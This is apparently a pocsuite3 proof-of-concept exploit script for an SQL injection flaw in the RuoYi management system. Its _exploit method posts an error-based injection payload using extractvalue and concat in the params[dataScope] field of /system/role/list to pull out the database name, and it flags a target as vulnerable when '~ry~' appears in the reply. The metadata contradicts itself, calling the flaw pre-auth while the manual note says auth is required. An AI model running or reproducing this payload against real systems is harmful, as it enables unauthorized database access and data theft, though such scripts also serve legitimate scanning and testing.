#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from urllib.parse import urljoin
import platform
import sys
import os
from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
)

minimum_version_required('2.0.2')


class DemoPOC(POCBase):
    vulID = '0'
    version = '1'
    author = 'xml'
    vulDate = '2023-02-07'
    createDate = '2023-02-07'
    updateDate = '2023-02-07'
    references = ['https://www.adminxe.com/2591.html']
    name = 'ruoyi ruoyi managment system Pre-Auth SQL Injection'
    appPowerLink = 'http://www.ruoyi.vip/'
    appName = 'ruoyi managment system'
    appVersion = ''
    vulType = 'SQL Injection'
    desc = 'Vulnerability description'
    samples = ['']
    install_requires = ['']
    pocDesc = 'User manual of poc, require auth'
    dork = {'zoomeye': ''}
    suricata_request = ''
    suricata_response = ''
    severity = 'high'

    # def _options(self):
    #     o = OrderedDict()
    #     o['param'] = OptString('', description='The param')
    #     return o

    def _exploit(self):
        url=urljoin(self.url,"/system/role/list")
        headers={
            "Content-Type": "application/x-www-form-urlencoded"
        }
        payload = 'pageSize=&pageNum=&orderByColumn=&isAsc=&roleName=&roleKey=&status=&params[beginTime]=&params[endTime]=&params[dataScope]=and extractvalue(1,concat(0x7e,substring((select database()),1,32),0x7e))'
        res = requests.post(url,headers=headers,data=payload)
        return res.text

    def _verify(self):
        result = {}
        res = self._exploit()
        if "~ry~" in res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['info'] = {}
            result['VerifyInfo']['info']['Severity']=self.severity
            result['VerifyInfo']['info']['Result']=res.split('\n')[0]
            result['VerifyInfo']['info']['file_name'] = os.path.basename(__file__)
            logger.critical(str(sys.argv[0]))
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)
